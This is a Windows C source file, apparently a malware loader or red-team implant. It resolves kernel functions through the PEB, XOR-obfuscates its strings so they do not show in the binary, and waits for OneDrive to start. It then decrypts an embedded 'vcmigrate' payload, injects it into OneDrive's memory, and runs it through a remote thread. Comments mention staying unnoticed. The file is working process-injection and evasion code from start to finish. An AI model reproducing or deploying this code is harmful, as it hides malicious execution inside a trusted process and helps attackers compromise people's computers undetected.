#include <Windows.h>

#include "../vcmigrate/vcmigrate.bin.inc"

#define UTILS_IMPLEMENTATION
#include "../utils.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Get kernel module handle from the PEB
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        goto shutdown;
    }

    // Populate frequently used function pointers from the kernel dll
    PopulateKernelFunctionPtrsByName(hKernel);

    // Use xored hex values to prevent clear text being embedded in the binary
    char cNotepad[] = {0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cNotepad, 11, key, key_len);

    // Use xored hex values to prevent clear text being embedded in the binary
    char cOneDrive[] = {0x7f, 0x5e, 0x55, 0x74, 0x42, 0x59, 0x46, 0x55, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cOneDrive, 12, key, key_len);

    // Find the process id of OneDrive so we can allocate memory and inject the vcmigrate payload into its memory
    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cOneDrive);

        if (dwProcID != -1)
            break;

        pSleep(5000);
    }

    // OpenProcess will all permissions. Permissions can be fine tuned for specific operations to avoid raising suspicions
    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);

    if (hProc == NULL)
    {
        goto shutdown;
    }

    // Allocate memory in the target process
    LPVOID lpvExecMem = pVirtualAllocEx(hProc, NULL, vcmigrate_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lpvExecMem == NULL)
    {
        goto shutdown;
    }

    // Un Xor the payload before writing it to the memory allocated in the target process
    MyXor(vcmigrate_data, vcmigrate_data_len, key, key_len);

    // Write the vcmigrate payload to the memory
    if (!pWriteProcessMemory(hProc, lpvExecMem, vcmigrate_data, vcmigrate_data_len, NULL))
    {
        goto shutdown;
    }

    // Change the permission of the memory to execute read
    DWORD dwOldProtect = 0;
    if (!pVirtualProtectEx(hProc, lpvExecMem, vcmigrate_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    // Create a thread in the process with the payload mem as start routine to execute the payload
    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvExecMem, NULL, 0, NULL);

    if (hThread != NULL)
    {
        // Wait for thread before continuing execution, timeout can be set to zero to continue without waiting
        pWaitForSingleObject(hThread, INFINITE);

        // Close the handle
        pCloseHandle(hThread);
    }

shutdown:
    if (hProc != NULL)
    {
        pCloseHandle(hProc);
    }

    return 0;
}